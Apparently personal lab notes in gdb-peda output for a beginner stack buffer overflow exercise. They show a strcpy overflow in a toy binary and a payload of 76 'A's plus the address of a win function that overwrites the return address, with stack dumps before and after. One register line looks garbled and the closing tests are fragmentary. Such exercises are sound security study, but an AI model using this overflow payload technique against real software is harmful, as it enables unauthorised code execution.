```
gdb-peda$ disas win
Dump of assembler code for function win:
   0x0804847d <+0>:     push   ebp
   0x0804847e <+1>:     mov    ebp,esp
   0x08048480 <+3>:     sub    esp,0x18
   0x08048483 <+6>:     mov    DWORD PTR [esp],0x8048580
   0x0804848a <+13>:    call   0x8048350 <puts@plt>
   0x0804848f <+18>:    mov    eax,DWORD PTR [ebp+0x8]
   0x08048492 <+21>:    mov    DWORD PTR [esp+0x4],eax
   0x08048496 <+25>:    mov    DWORD PTR [esp],0x804859f
   0x0804849d <+32>:    call   0x8048330 <printf@plt>
   0x080484a2 <+37>:    leave
   0x080484a3 <+38>:    ret
End of assembler dump.
gdb-peda$ disas loose

Dump of assembler code for function loose:
   0x080484a4 <+0>:     push   ebp
   0x080484a5 <+1>:     mov    ebp,esp
   0x080484a7 <+3>:     sub    esp,0x58
   0x080484aa <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x080484ad <+9>:     mov    DWORD PTR [esp+0x4],eax
   0x080484b1 <+13>:    lea    eax,[ebp-0x48]
   0x080484b4 <+16>:    mov    DWORD PTR [esp],eax
   0x080484b7 <+19>:    call   0x8048340 <strcpy@plt>
   0x080484bc <+24>:    mov    DWORD PTR [esp],0x80485b1
   0x080484c3 <+31>:    call   0x8048350 <puts@plt>
   0x080484c8 <+36>:    leave
   0x080484c9 <+37>:    ret
End of assembler dump.
gdb-peda$ disas main
Dump of assembler code for function main:
   0x080484ca <+0>:     push   ebp
   0x080484cb <+1>:     mov    ebp,esp
   0x080484cd <+3>:     and    esp,0xfffffff0
   0x080484d0 <+6>:     sub    esp,0x10
   0x080484d3 <+9>:     mov    eax,DWORD PTR [ebp+0xc]
   0x080484d6 <+12>:    add    eax,0x4
   0x080484d9 <+15>:    mov    eax,DWORD PTR [eax]
   0x080484db <+17>:    mov    DWORD PTR [esp],eax
   0x080484de <+20>:    call   0x80484a4 <loose>
   0x080484e3 <+25>:    leave
   0x080484e4 <+26>:    ret
End of assembler dump.
```
We are setting the breakpoint at **call   strcpy**
```
b * 0x080484b7
```
Run with parameter
```
 r $(python -c 'print"A"*76+"\x7d\x84\x04\x08"')
```
Show Registers
```
gdb-peda$ i r ebp esp eip
ebp            0xbffff3d8       0xbffff3d8
esp            0xbffff380       0xbffff380
eip            0x80484b7        0x80484b7 <loose+19>7       0xb7e20647 <__libc_start_main+247>
```
Examine stackframe
```
0xbffff380:     0xbffff390      0xbffff618      0xbffff3a0      0x08048269
0xbffff390:     0x00000000      0xbffff434      0xb7fbb000      0x0000f037
0xbffff3a0:     0xffffffff      0x0000002f      0xb7e14dc8      0xb7fd51b0
0xbffff3b0:     0x00008000      0xb7fbb000      0xb7fb9244      0x080482fd
0xbffff3c0:     0x00000002      0x00000000      0x0804a000      0x08048542
0xbffff3d0:     0x00000002      0xbffff494
```

Step over. We are now here. Right after strcpy
```
gdb-peda$ disas loose
Dump of assembler code for function loose:
   0x080484a4 <+0>:     push   ebp
   0x080484a5 <+1>:     mov    ebp,esp
   0x080484a7 <+3>:     sub    esp,0x58
   0x080484aa <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x080484ad <+9>:     mov    DWORD PTR [esp+0x4],eax
   0x080484b1 <+13>:    lea    eax,[ebp-0x48]
   0x080484b4 <+16>:    mov    DWORD PTR [esp],eax
   0x080484b7 <+19>:    call   0x8048340 <strcpy@plt>
=> 0x080484bc <+24>:    mov    DWORD PTR [esp],0x80485b1
   0x080484c3 <+31>:    call   0x8048350 <puts@plt>
   0x080484c8 <+36>:    leave
   0x080484c9 <+37>:    ret
```
Check the registers
```
gdb-peda$ i r ebp esp eip
ebp            0xbffff3d8       0xbffff3d8
esp            0xbffff380       0xbffff380
eip            0x80484bc        0x80484bc <loose+24>
```
Examine Stack
```
0xbffff380:     0xbffff390      0xbffff618      0xbffff3a0      0x08048269
0xbffff390:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff3a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff3b0:     0x41414141      0x41414141      0x41414141      0x41414141
```
Step over and examine stack
```
gdb-peda$ x/16xw $esp
0xbffff380:     0x080485b1      0xbffff618      0xbffff3a0      0x08048269
0xbffff390:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff3a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff3b0:     0x41414141      0x41414141      0x41414141      0x41414141
```
We see that **mov    DWORD PTR [esp],0x80485b1** copied the value to the address ESP is pointing.

Step into puts
```
[-------------------------------------code-------------------------------------]
   0x8048340 <strcpy@plt>:      jmp    DWORD PTR ds:0x804a010
   0x8048346 <strcpy@plt+6>:    push   0x8
   0x804834b <strcpy@plt+11>:   jmp    0x8048320
=> 0x8048350 <puts@plt>:        jmp    DWORD PTR ds:0x804a014
 | 0x8048356 <puts@plt+6>:      push   0x10
 | 0x804835b <puts@plt+11>:     jmp    0x8048320
 | 0x8048360 <__gmon_start__@plt>:      jmp    DWORD PTR ds:0x804a018
 | 0x8048366 <__gmon_start__@plt+6>:    push   0x18
 |->   0x8048356 <puts@plt+6>:  push   0x10
       0x804835b <puts@plt+11>: jmp    0x8048320
       0x8048360 <__gmon_start__@plt>:  jmp    DWORD PTR ds:0x804a018
       0x8048366 <__gmon_start__@plt+6>:        push   0x18
```
The registers
```
ebp            0xbffff3d8       0xbffff3d8
esp            0xbffff37c       0xbffff37c
eip            0x8048350        0x8048350 <puts@plt>
```
Examine puts stack
```
0xbffff37c:     0x080484c8      0x080485b1      0xbffff618      0xbffff3a0
0xbffff38c:     0x08048269      0x41414141      0x41414141      0x41414141
0xbffff39c:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff3ac:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff3bc:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff3cc:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff3dc:     0x0804847d      0xbffff600      0x0804821c
```

*****. TESTS for 21c ******
With 50
```
gdb-peda$ x/32xw 0xbffff37c
0xbffff37c:     0x00f0b5ff      0xbffff3be      0x00000001      0x000000c2
0xbffff38c:     0xb7e9879b      0xbffff3be      0xbffff4c0      0x000000e0
0xbffff39c:     0x00000000      0xb7fff000      0xb7fff918      0xbffff3c0
0xbffff3ac:     0x08048269      0x00000000      0xbffff454      0xb7fbb000
0xbffff3bc:     0x0000f037      0xffffffff      0x0000002f      0xb7e14dc8
0xbffff3cc:     0xb7fd51b0      0x00008000      0xb7fbb000      0xb7fb9244
0xbffff3dc:     0x080482fd      0x00000002      0x00000000      0x0804a000
0xbffff3ec:     0x08048542      0x00000002      0xbffff4b4      0xbffff4c0
```
With 51
```
gdb-peda$ x/32xw 0xbffff37c
0xbffff37c:     0xb7e9879b      0xbffff3ae      0xbffff4b0      0x000000e0
0xbffff38c:     0x00000000      0xb7fff000      0xb7fff918      0xbffff3b0
0xbffff39c:     0x08048269      0x00000000      0xbffff444      0xb7fbb000
0xbffff3ac:     0x0000f037      0xffffffff      0x0000002f      0xb7e14dc8
0xbffff3bc:     0xb7fd51b0      0x00008000      0xb7fbb000      0xb7fb9244
0xbffff3cc:     0x080482fd      0x00000002      0x00000000      0x0804a000
0xbffff3dc:     0x08048542      0x00000002      0xbffff4a4      0xbffff4b0
0xbffff3ec:     0xb7e36c1b      0xb7fbb3dc      0x0804821c      0x080484fb
```

x/32xw 0xbffff37c
set {int}0xbffff3e4 = 0
i r ebp esp eip